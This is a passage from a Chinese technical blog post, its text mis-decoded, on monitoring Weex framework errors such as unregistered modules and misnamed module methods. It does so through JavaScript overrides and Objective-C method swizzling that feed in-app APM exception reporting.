  <span class="hljs-comment">// 2. å…³é”®æ ¡éªŒï¼šæ£€æŸ¥Moduleæ˜¯å¦åœ¨Nativeä¾§æ³¨å†Œè¿‡</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isRegisteredModule</span>(moduleName)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"[JS Framework] using unregistered weex module \""</span> + moduleName + <span class="hljs-string">"\""</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 3. æ ¸å¿ƒï¼šåˆ›å»ºModuleä»£ç†å¯¹è±¡ï¼ˆå¹¶éçœŸå®å¯¹è±¡ï¼Œä»…å°è£…æ¡¥æ¥è°ƒç”¨ï¼‰</span>
  <span class="hljs-keyword">var</span> moduleProxy = {};
  <span class="hljs-comment">// è·å–è¯¥Moduleåœ¨Nativeä¾§æ³¨å†Œçš„æ‰€æœ‰æ–¹æ³•ï¼ˆæå‰ä»NativeåŒæ­¥åˆ°JSçš„æ–¹æ³•æ˜ å°„è¡¨ï¼‰</span>
  <span class="hljs-keyword">var</span> moduleMethods = <span class="hljs-title function_">getRegisteredMethods</span>(moduleName);
  
  <span class="hljs-comment">// 4. ä¸ºä»£ç†å¯¹è±¡ç»‘å®šæ–¹æ³•ï¼šè°ƒç”¨æ–¹æ³•æ—¶è§¦å‘JS-Nativeæ¡¥æ¥</span>
  moduleMethods.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">methodName</span>) {
    moduleProxy[methodName] = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// å°è£…è°ƒç”¨å‚æ•°ï¼šå®ä¾‹IDã€Moduleåã€æ–¹æ³•åã€å‚æ•°ã€å›è°ƒ</span>
      <span class="hljs-keyword">var</span> args = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">slice</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">arguments</span>);
      <span class="hljs-keyword">var</span> callback = <span class="hljs-literal">null</span>;
      <span class="hljs-comment">// æå–æœ€åä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒï¼ˆWeexçº¦å®šï¼‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[args.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] === <span class="hljs-string">'function'</span>) {
        callback = args.<span class="hljs-title function_">pop</span>();
      }
      
      <span class="hljs-comment">// 5. æ ¸å¿ƒï¼šé€šè¿‡taskCenterï¼ˆæ¡¥æ¥æ ¸å¿ƒï¼‰è°ƒç”¨Native</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>.<span class="hljs-title function_">sendNative</span>(<span class="hljs-string">'callNative'</span>, {
        <span class="hljs-attr">instanceId</span>: id,
        <span class="hljs-attr">module</span>: moduleName,
        <span class="hljs-attr">method</span>: methodName,
        <span class="hljs-attr">params</span>: args,
        <span class="hljs-attr">callback</span>: callback ? <span class="hljs-title function_">generateCallbackId</span>(callback) : <span class="hljs-literal">null</span>
      });
    }.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);
  }, <span class="hljs-variable language_">this</span>);

  <span class="hljs-comment">// 6. è¿”å›ä»£ç†å¯¹è±¡ç»™JSä¾§ä½¿ç”¨</span>
  <span class="hljs-keyword">return</span> moduleProxy;
};
</code></pre>
<ul>
<li>è¿”å›çš„ä¸æ˜¯çœŸå®çš„ Module å®ä¾‹ï¼Œè€Œæ˜¯ä»£ç†å¯¹è±¡ï¼ˆProxyï¼‰ â€”â€” æ‰€æœ‰æ–¹æ³•è°ƒç”¨éƒ½ä¼šè¢«æ‹¦æˆªï¼Œè½¬è€Œé€šè¿‡æ¡¥æ¥å‘é€åˆ° Nativeï¼›</li>
<li>isRegisteredModule æ ¡éªŒï¼šJS ä¾§ä¼šç¼“å­˜ä¸€ä»½ã€ŒNative å·²æ³¨å†Œ Module åˆ—è¡¨ã€ï¼ˆNative åˆå§‹åŒ–æ—¶åŒæ­¥åˆ° JSï¼‰ï¼Œé¿å…æ— æ•ˆæ¡¥æ¥ã€‚</li>
</ul>
<p>æ–¹æ¡ˆä¸€ï¼šWeex ç”±äºå®‰å…¨è®¾è®¡ï¼Œæ²¡åŠæ³•ç›´æ¥æ³¨å…¥ JSã€‚ä¹Ÿå°±æ˜¯è¯´æƒ³é€šè¿‡â€œåˆ‡é¢â€æ€æƒ³ï¼Œhook JS ä¾§ requireModule æ˜¯è¡Œä¸é€šçš„ã€‚è¿™ç§æ–¹æ¡ˆï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-JS" lang="JS"><span class="hljs-comment">// å¤‡ä»½åŸç”ŸrequireModuleæ–¹æ³•</span>
<span class="hljs-keyword">const</span> originalRequireModule = <span class="hljs-title class_">WeexInstance</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">requireModule</span>;

<span class="hljs-comment">// é‡å†™requireModuleï¼Œåœ¨é”™è¯¯è§¦å‘æ—¶ä¸»åŠ¨ä¸ŠæŠ¥Native</span>
<span class="hljs-title class_">WeexInstance</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">requireModule</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">moduleName</span>) {
  <span class="hljs-comment">// å…ˆæ‰§è¡ŒåŸç”Ÿåˆ¤æ–­é€»è¾‘</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">getId</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">if</span> (!(id &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>)) {
    <span class="hljs-keyword">const</span> errorMsg = <span class="hljs-string">"[JS Framework] Failed to requireModule(\""</span> + moduleName + <span class="hljs-string">"\"), instance ("</span> + id + <span class="hljs-string">") doesn't exist anymore."</span>;
    <span class="hljs-comment">// ä¸»åŠ¨ä¸ŠæŠ¥â€œå®ä¾‹ä¸å­˜åœ¨â€é”™è¯¯åˆ°Native</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>.<span class="hljs-title function_">sendNative</span>(<span class="hljs-string">'__weex_apm_report'</span>, {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'module_require_failed'</span>,
      <span class="hljs-attr">subType</span>: <span class="hljs-string">'instance_not_exist'</span>,
      <span class="hljs-attr">moduleName</span>: moduleName,
      <span class="hljs-attr">message</span>: errorMsg,
      <span class="hljs-attr">instanceId</span>: id
    });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(errorMsg);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ ¸å¿ƒï¼šæ‹¦æˆªâ€œæœªæ³¨å†ŒModuleâ€åˆ¤æ–­</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isRegisteredModule</span>(moduleName)) {
    <span class="hljs-keyword">const</span> warnMsg = <span class="hljs-string">"[JS Framework] using unregistered weex module \""</span> + moduleName + <span class="hljs-string">"\""</span>;
    <span class="hljs-comment">// ä¸»åŠ¨ä¸ŠæŠ¥â€œModuleæœªæ³¨å†Œâ€é”™è¯¯åˆ°Nativeï¼ˆå…³é”®ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>.<span class="hljs-title function_">sendNative</span>(<span class="hljs-string">'__weex_apm_report'</span>, {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'module_not_registered'</span>,
      <span class="hljs-attr">moduleName</span>: moduleName,
      <span class="hljs-attr">message</span>: warnMsg,
      <span class="hljs-attr">instanceId</span>: id,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
    });
    <span class="hljs-comment">// ä¿ç•™åŸç”Ÿwarnæ—¥å¿—ï¼ˆä¸å½±å“åŸæœ‰é€»è¾‘ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(warnMsg);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ‰§è¡ŒåŸç”Ÿé€»è¾‘</span>
  <span class="hljs-keyword">return</span> originalRequireModule.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, moduleName);
};
</code></pre>
<p>æ–¹æ¡ˆäºŒï¼šNative ä¾§æ‹¦æˆª JS çš„ console.warn è°ƒç”¨ï¼ˆæ—  JS ä¾µå…¥ï¼‰</p>
<p>å†™æ³•1ï¼šWeex JS ä¾§çš„ <code>console.warn</code> æœ€ç»ˆä¼šé€šè¿‡ WXBridgeContext çš„ <code>handleJSLog</code> æ–¹æ³•ä¼ é€’åˆ° Nativeï¼Œæ— éœ€è§£ææœ€ç»ˆæ—¥å¿—ï¼Œç›´æ¥ Hook è¯¥æ–¹æ³•æ‹¦æˆª warn ä¿¡æ¯ï¼Œç²¾å‡†åŒ¹é… Module æœªæ³¨å†Œé”™è¯¯</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">#import &lt;objc/runtime.h&gt;

@implementation NSObject (WXJSLogHook)
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&amp;onceToken, ^{
        // è·å–WXBridgeContextç±»ï¼ˆæ— éœ€å¤´æ–‡ä»¶ï¼‰
        Class bridgeContextClass = NSClassFromString(@"WXBridgeContext");
        if (!bridgeContextClass) return;
        
        // Hookå¤„ç†JSæ—¥å¿—çš„æ ¸å¿ƒæ–¹æ³•ï¼šhandleJSLog:
        SEL handleJSLogSel = NSSelectorFromString(@"handleJSLog:");
        Method originalMethod = class_getInstanceMethod(bridgeContextClass, handleJSLogSel);
        if (!originalMethod) return;
        
        SEL swizzledSel = NSSelectorFromString(@"weex_apm_handleJSLog:");
        Method swizzledMethod = class_getInstanceMethod(self, swizzledSel);
        class_addMethod(bridgeContextClass, swizzledSel, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));
        method_exchangeImplementations(originalMethod, swizzledMethod);
    });
}

// Hookåçš„handleJSLogæ–¹æ³•ï¼šæ‹¦æˆªJSä¾§çš„warnæ—¥å¿—
- (void)weex_apm_handleJSLog:(NSDictionary *)logInfo {
    // 1. å…ˆæ‰§è¡ŒåŸæ–¹æ³•ï¼Œä¿ç•™åŸæœ‰æ—¥å¿—è¾“å‡ºé€»è¾‘
    [self weex_apm_handleJSLog:logInfo];
    
    // 2. è§£æJSæ—¥å¿—ä¿¡æ¯ï¼ˆlogInfoæ ¼å¼ï¼š{level: 'warn', msg: 'xxx', ...}ï¼‰
    NSString *logLevel = logInfo[@"level"];
    NSString *logMsg = logInfo[@"msg"];
    
    // 3. ç²¾å‡†åŒ¹é…â€œæœªæ³¨å†ŒModuleâ€çš„warn
    if ([logLevel isEqualToString:@"warn"] &amp;&amp; [logMsg containsString:@"using unregistered weex module"]) {
        // æå–Moduleåç§°
        NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"using unregistered weex module \"(.*?)\"" options:0 error:nil];
        NSTextCheckingResult *match = [regex firstMatchInString:logMsg options:0 range:NSMakeRange(0, logMsg.length)];
        NSString *moduleName = match ? [logMsg substringWithRange:match.rangeAtIndex(1)] : @"";
        
        // 4. æ„é€ APMæ•°æ®ä¸ŠæŠ¥
        NSDictionary *apmData = @{
            @"error_type": @"weex_module_not_registered",
            @"module_name": moduleName,
            @"message": logMsg,
            @"source": @"js_console_warn", // æ ‡è®°æ¥æºï¼šJS console.warn
            @"timestamp": @([[NSDate date] timeIntervalSince1970] * 1000)
        };
        
        // è°ƒç”¨ APM SDK æ¥å£ï¼Œæ•°æ®å…ˆè½åº“ï¼Œåç»­ç»Ÿä¸€æŒ‰ç…§æ•°æ®ä¸ŠæŠ¥ç­–ç•¥ï¼Œä»æœ¬åœ° DB æå–ã€èšåˆã€ä¸ŠæŠ¥
        // [YourAPMManager reportWeexError:apmData];
    }
}
@end
</code></pre>
<p>æ ¸å¿ƒä¼˜åŠ¿</p>
<ul>
<li>æ— ä¾µå…¥ï¼šæ— éœ€ä¿®æ”¹ / æ³¨å…¥ JS ä»£ç ï¼Œçº¯ Native ä¾§å®ç°ï¼›</li>
<li>ç²¾å‡†ï¼šæ‹¦æˆªçš„æ˜¯ JS ä¾§ä¼ é€’åˆ° Native çš„åŸå§‹æ—¥å¿—æ•°æ®ï¼ˆè€Œéæœ€ç»ˆæ‰“å°çš„å­—ç¬¦ä¸²ï¼‰ï¼Œæ— æ ¼å¼è¯¯å·®ï¼›</li>
<li>è¦†ç›–å…¨ï¼šæ‰€æœ‰ JS ä¾§çš„console.warnéƒ½ä¼šç»è¿‡æ­¤æ–¹æ³•ï¼Œ100% è¦†ç›– Module æœªæ³¨å†Œåœºæ™¯</li>
</ul>
<p>å†™æ³•äºŒï¼šç”±äº Weex ä»£ç æ˜¯å¤§é‡çš„å­˜é‡ä¸šåŠ¡ä»£ç ï¼Œå¾ˆç¨³å®šã€‚è€Œä¸” Weex å®˜æ–¹å¥½å‡ å¹´ä¸æ›´æ–°ï¼Œæ‰€ä»¥æˆ‘ä»¬å†…éƒ¨ç§æœ‰åŒ– Weex SDKï¼Œä¹Ÿå°±æ²¡æœ‰é‡‡å– Hook æ‰‹æ®µã€‚è€Œæ˜¯ç›´æ¥ä¿®æ”¹æºç ï¼Œ<code>WXBridgeContext.m</code> çš„ <code>+ (void)handleConsoleOutputWithArgument:(NSArray *)arguments logLevel:(WXLogFlag)logLevel</code> æ–¹æ³•ã€‚æ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">+ (void)handleConsoleOutputWithArgument:(NSArray *)arguments logLevel:(WXLogFlag)logLevel
{
    NSMutableString *string = [NSMutableString string];
    [string appendString:@"jsLog: "];
    [arguments enumerateObjectsUsingBlock:^(JSValue *jsVal, NSUInteger idx, BOOL *stop) {
        [string appendFormat:@"%@ ", jsVal];
        if (idx == arguments.count - 1) {
            if (logLevel) {
                if (WXLogFlagWarning == logLevel || WXLogFlagError == logLevel) {
                    if ([string containsString:@"using unregistered weex module"]) {
                        // æå–Moduleåç§°
                        NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"using unregistered weex module \"(.*?)\"" options:0 error:nil];
                        NSTextCheckingResult *match = [regex firstMatchInString:string options:0 range:NSMakeRange(0, string.length)];
                        NSString *moduleName = match ? [string substringWithRange:[match rangeAtIndex:1]] : @"";
                        
                        // æ¥å…¥æ”¶å£å·¥å…·ç±»
                        NSString *exceptionMsg = [NSString stringWithFormat:@"JS requireæœªæ³¨å†Œæ¨¡å—ï¼š%@ï¼ŒåŸå§‹æ—¥å¿—ï¼š%@", moduleName, string];
                        NSDictionary *customExt = @{@"moduleName": moduleName};
                        NSString *instanceId = [WXSDKEngine topInstance].instanceId ?: @"";
                        NSString *bundleUrl = [WXSDKEngine topInstance].scriptURL.absoluteString ?: @"";
                        [[WXExceptionReporter sharedInstance] reportExceptionWithCode:WXCustomExceptionCode_Module_NotRegistered
                                                                        exceptionType:WXCustomExceptionType_Module
                                                                            instanceId:instanceId
                                                                             function:@"handleConsoleOutputWithArgument:logLevel:"
                                                                         exceptionMsg:exceptionMsg
                                                                            bundleUrl:bundleUrl
                                                                         customExtParams:customExt];
                    }
                    
                    id&lt;WXAppMonitorProtocol&gt; appMonitorHandler = [WXSDKEngine handlerForProtocol:@protocol(WXAppMonitorProtocol)];
                    if ([appMonitorHandler respondsToSelector:@selector(commitAppMonitorAlarm:monitorPoint:success:errorCode:errorMsg:arg:)]) {
                        [appMonitorHandler commitAppMonitorAlarm:@"weex" monitorPoint:@"jswarning" success:NO errorCode:@"99999" errorMsg:string arg:[WXSDKEngine topInstance].pageName];
                    }
                }
                WX_LOG(logLevel, @"%@", string);
            } else {
                [string appendFormat:@"%@ ", jsVal];
                WXLogInfo(@"%@", string);
            }
        }
    }];
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feaa4cd760594fb0bf97f43cff8d8778~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=CzPMJNi1rHB2uiQkqsrjsWjl49M%3D" alt="WeexRequireModuleErrorAPM.png" loading="lazy"/></p>
<h4 data-id="heading-75">2. JS è°ƒç”¨ Moudle æ–¹æ³•å¤±è´¥</h4>
<p>Native æ³¨å†Œäº†ä¸€ä¸ªè´Ÿè´£é€»è¾‘çš„ Moduleï¼Œä½†æ˜¯åœ¨ JS ä¾§ä½¿ç”¨çš„æ—¶å€™ï¼Œè¦ä¹ˆæ–¹æ³•åå†™é”™äº†ï¼Œè¦ä¹ˆå‚æ•°å°‘ä¼ äº†ï¼Œéƒ½å¯èƒ½å¯¼è‡´é¢„æœŸçš„é€»è¾‘æ‰§è¡Œé”™è¯¯ï¼Œå‘ç”Ÿä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚</p>
<h5 data-id="heading-76">1. ç‚¹å‡»äº‹ä»¶å·¥ä½œåŸç†</h5>
<p>æ ¸å¿ƒé—®é¢˜ï¼šç‚¹å‡»äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¦‚ä½•æ ¹æ® Component çš„ç‚¹å‡»äº‹ä»¶å®šä½åˆ°è¯¥ Component åœ¨ Vue DSL ä¸­å£°æ˜çš„äº‹ä»¶ï¼Ÿ</p>
<p>ç¬¬ä¸€æ­¥ï¼šé¡µé¢åˆå§‹åŒ–æ—¶ï¼ŒJS ä¾§æ„å»º<strong>äº‹ä»¶æ˜ å°„è¡¨</strong>ã€‚
Weex é¡µé¢æ¸²æŸ“æ—¶ï¼Œä¼šä¸ºæ¯ä¸ªç»„ä»¶åš2ä»¶äº‹æƒ…ï¼š</p>
<ul>
<li>ç”Ÿæˆç»„ä»¶å”¯ä¸€æ ‡è¯†ï¼šæ¯ä¸ªç»„ä»¶éƒ½æœ‰ <code>ref/componentId/docId</code>ï¼Œç±»ä¼¼ç»„ä»¶èº«ä»½è¯</li>
<li>ç»‘å®šäº‹ä»¶ä¸æ–¹æ³•ï¼šè§£æ <code>@click="handleButtonClick"</code> æ—¶ï¼ŒJS ä¼šå°†ã€Œç»„ä»¶ ID + äº‹ä»¶ç±»å‹ï¼ˆclickï¼‰ã€ä½œä¸º keyï¼Œ<code>handleButtonClick</code> ä½œä¸º valueï¼Œä¸€èµ·å­˜è¿›ç»„ä»¶å®ä¾‹çš„æ˜ å°„è¡¨é‡Œï¼Œï¼ˆå¯¹åº”ä¸‹é¢çš„ <code>this.event[type]</code>ï¼‰</li>
</ul>
<p>ç¬¬äºŒæ­¥ï¼šNative ä¾§æ•è·ç‚¹å‡»ï¼Œæºå¸¦å…³é”®ä¿¡æ¯è°ƒç”¨ fireEventã€‚
Native ä¾§èƒ½æ‹¿åˆ° componentIdï¼Œæ˜¯å› ä¸ºæ¸²æŸ“ç»„ä»¶æ—¶ï¼ŒJS ä¾§ä¼šæŠŠç»„ä»¶ ID åŒæ­¥ç»™ Native æ¸²æŸ“å¼•æ“ï¼ˆWXComponentï¼‰ï¼ŒNative æ§ä»¶å’Œ JS ç»„ä»¶å®ä¾‹é€šè¿‡ ID ä¸€ä¸€ç»‘å®š</p>
<p>ç¬¬ä¸‰æ­¥ï¼šJS ä¾§è°ƒç”¨ <code>fireEvent</code> æ–¹æ³•ï¼Œå…¶å†…éƒ¨é€šè¿‡ <code>ID + äº‹ä»¶ç±»å‹</code> æ‰¾æ–¹æ³•ã€‚</p>
<ul>
<li>å®šä½ç»„ä»¶å®ä¾‹ï¼šJS é€šè¿‡ componentIDï¼ˆä»£ç é‡Œçš„ this.refï¼‰æ‰¾åˆ°ç»„ä»¶å®ä¾‹ã€‚</li>
<li>æŸ¥æ‰¾äº‹ä»¶æ˜ å°„ï¼šä»ç»„ä»¶å®ä¾‹çš„ <code>this.event</code> é‡Œæ ¹æ® type ï¼ˆå¦‚ clickï¼‰æ‰¾åˆ°å…·ä½“çš„ eventDescï¼ˆåŒ…å«å…·ä½“çš„ handlerï¼‰</li>
<li>å‘èµ·è°ƒç”¨ <code>handler.call</code></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
   * Fire an event manually.
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} type type
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">function</span>} event handler
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} isBubble whether or not event bubble
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} <span class="hljs-variable">options</span>
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type"/>} anything returned by handler function
   */</span>
  <span class="hljs-title class_">Element</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">fireEvent</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">fireEvent</span> (type, event, isBubble, options) {
    <span class="hljs-keyword">var</span> result = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">var</span> isStopPropagation = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">var</span> eventDesc = <span class="hljs-variable language_">this</span>.<span class="hljs-property">event</span>[type];
    <span class="hljs-keyword">if</span> (eventDesc &amp;&amp; event) {
      <span class="hljs-keyword">var</span> handler = eventDesc.<span class="hljs-property">handler</span>;
      event.<span class="hljs-property">stopPropagation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        isStopPropagation = <span class="hljs-literal">true</span>;
      };
      <span class="hljs-keyword">if</span> (options &amp;&amp; options.<span class="hljs-property">params</span>) {
        result = handler.<span class="hljs-property">call</span>.<span class="hljs-title function_">apply</span>(handler, [ <span class="hljs-variable language_">this</span> ].<span class="hljs-title function_">concat</span>( options.<span class="hljs-property">params</span>, [event] ));
      }
      <span class="hljs-keyword">else</span> {
        result = handler.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
      }
    }

    <span class="hljs-keyword">if</span> (!isStopPropagation
      &amp;&amp; isBubble
      &amp;&amp; (<span class="hljs-variable constant_">BUBBLE_EVENTS</span>.<span class="hljs-title function_">indexOf</span>(type) !== -<span class="hljs-number">1</span>)
      &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>
      &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>.<span class="hljs-property">fireEvent</span>) {
      event.<span class="hljs-property">currentTarget</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">fireEvent</span>(type, event, isBubble); <span class="hljs-comment">// no options</span>
    }

    <span class="hljs-keyword">return</span> result
  };
</code></pre>
<h5 data-id="heading-77">2. JS è°ƒç”¨ module æ–¹æ³•ï¼Œæ–¹æ³•åé”™è¯¯</h5>
<p>Native æ³¨å†Œçš„ Module æ–¹æ³•åä¸º <code>multiply:num2:callback:</code>ï¼Œè€Œåœ¨ JS ä¾§è°ƒç”¨çš„æ—¶å€™æ–¹æ³•åå¤šåŠ äº†å‡ ä¸ªå­—ç¬¦ï¼Œé€ æˆæ–¹æ³•åå¯¹ä¸ä¸Šï¼Œæ–¹æ³•è°ƒç”¨å¤±è´¥çš„é—®é¢˜ã€‚</p>
<p>ç”¨æˆ·ç‚¹å‡»å±å¹•ä¸Šçš„ UI æ§ä»¶ï¼ˆæ­¤å¤„å°±æ˜¯æ³¨å†Œ Component <code>[WXSDKEngine registerComponent:@"color-button" withClass:[WXColorButtonComponent class]]</code>)ã€‚</p>
<p>Weex ç»Ÿä¸€ç»™ Comonent æ·»åŠ äº†åˆ†ç±»æ¥è´Ÿè´£äº‹ä»¶çš„å¤„ç†ã€‚<code>WXComponent+Events</code>ã€‚æºç ä¸­ <code>addClickEvent</code> å°±æ˜¯æ·»åŠ äº†ç‚¹å‡»äº‹ä»¶çš„ç›‘å¬ã€‚å½“å‘ç”Ÿç‚¹å‡»åä¼šè®¡ç®—ç‚¹å‡»äº‹ä»¶çš„åæ ‡å’Œæ—¶é—´æˆ³ä¿¡æ¯ï¼Œæœ€åå°è£…ä¸€ä¸ª <code>WXCallJSMethod</code> å¯¹è±¡ï¼Œæ–¹æ³•åå›ºå®šä¸º <code>fireEvent</code>ã€‚å¦‚ä¸‹å †æ ˆæ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aa523b5d1a047e690cd3e0d5e178dbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=WvFysSIJKSbgGF6gOWhsRXSiMLk%3D" alt="WeexComponentClickLogic.png" loading="lazy"/></p>
<p>ç”±äº <code>logicCalculation</code> æ²¡æœ‰å¯¹åº”çš„ <code>multiplyWith</code> æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œè¢« JS çš„ <code>try...catch...</code> æ•è·åï¼Œé€šè¿‡ <code>console.error</code> çš„æ–¹å¼è¾“å‡ºå¼‚å¸¸ä¿¡æ¯ã€‚ä½†æ˜¯ <code>console.error</code> è¢« Native æ¥ç®¡äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ Native æ¥ç®¡çš„åœ°æ–¹ç»Ÿä¸€æ‹¦æˆªå¤„ç†ã€‚åªè¦æ—¥å¿—åŒ…å« <code>Failed to invoke the event handler</code> å°±å¯ä»¥è®¤ä¸ºæ˜¯å› ä¸ºæ–¹æ³•åé—®é¢˜ï¼Œå¯¼è‡´è°ƒç”¨æ–¹æ³•å‡ºé”™</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-Objective-c" lang="Objective-c">+ (void)handleConsoleOutputWithArgument:(NSArray *)arguments logLevel:(WXLogFlag)logLevel
{
    // ...
    if ([string containsString:@"Failed to invoke the event handler"]) {
        // åŸæœ‰è§£æé€»è¾‘ä¿ç•™
                        NSString *errorMethodName = @"";
                        NSString *eventType = @"";
                        NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"'\\.\\.\\.(?:logicCalculation\\.)([a-zA-Z0-9_]+)\\.\\.\\." options:0 error:nil];
                        NSTextCheckingResult *match = [regex firstMatchInString:string options:0 range:NSMakeRange(0, string.length)];
                        if (match) {
                            errorMethodName = [string substringWithRange:[match rangeAtIndex:1]];
                        }
                        NSRegularExpression *eventRegex = [NSRegularExpression regularExpressionWithPattern:@"event handler of \"([^\"]+)\"" options:0 error:nil];
                        NSTextCheckingResult *eventMatch = [eventRegex firstMatchInString:string options:0 range:NSMakeRange(0, string.length)];
                        if (eventMatch) {
                            eventType = [string substringWithRange:[eventMatch rangeAtIndex:1]];
                        }
                        
                        // æ¥å…¥æ”¶å£å·¥å…·ç±»
                        NSString *exceptionMsg = [NSString stringWithFormat:@"Moduleæ–¹æ³•åé”™è¯¯ï¼š%@ï¼Œäº‹ä»¶ç±»å‹ï¼š%@ï¼ŒåŸå§‹æ—¥å¿—ï¼š%@", errorMethodName, eventType, string];
                        NSDictionary *customExt = @{
                            @"moduleName": @"logicCalculation",
                            @"methodName": errorMethodName,
                            @"eventType": eventType
                        };
                        NSString *instanceId = [WXSDKEngine topInstance].instanceId ?: @"";
                        NSString *bundleUrl = [WXSDKEngine topInstance].scriptURL.absoluteString ?: @"";
                        [[WXExceptionReporter sharedInstance] reportExceptionWithCode:WXCustomExceptionCode_Module_MethodNotFound
                                                                         exceptionType:WXCustomExceptionType_Module
                                                                            instanceId:instanceId
                                                                              function:@"handleConsoleOutputWithArgument:logLevel:"
                                                                         exceptionMsg:exceptionMsg
                                                                             bundleUrl:bundleUrl
                                                                         customExtParams:customExt];
    }
    // ...
}
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caecf4541d1646cfadc4fb59dd7abf93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=MZypkqirSmTiJApbXBRu7j6mUvM%3D" alt="WeexCallModuleMethodNameMismatch.png" loading="lazy"/></p>
<h5 data-id="heading-78">3. JS è°ƒç”¨ module æ–¹æ³•ï¼Œæ–¹æ³•å‚æ•°ä¸ªæ•°ä¸åŒ¹é…</h5>
<p>ä¸Šé¢å·²ç»è®²äº†ç‚¹å‡»äº‹ä»¶çš„å·¥ä½œæµç¨‹ï¼Œè°ƒç”¨æ–¹æ³•æ—¶ï¼Œé™¤äº†è°ƒç”¨äº†ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–è€…æ–¹æ³•åå†™é”™äº†ï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯å‚æ•°ä¸ªæ•°ä¸åŒ¹é…ã€‚</p>
<p>è¿™ç§æƒ…å†µå¦‚ä½•è¯†åˆ«å¹¶ç›‘æ§ï¼Ÿ
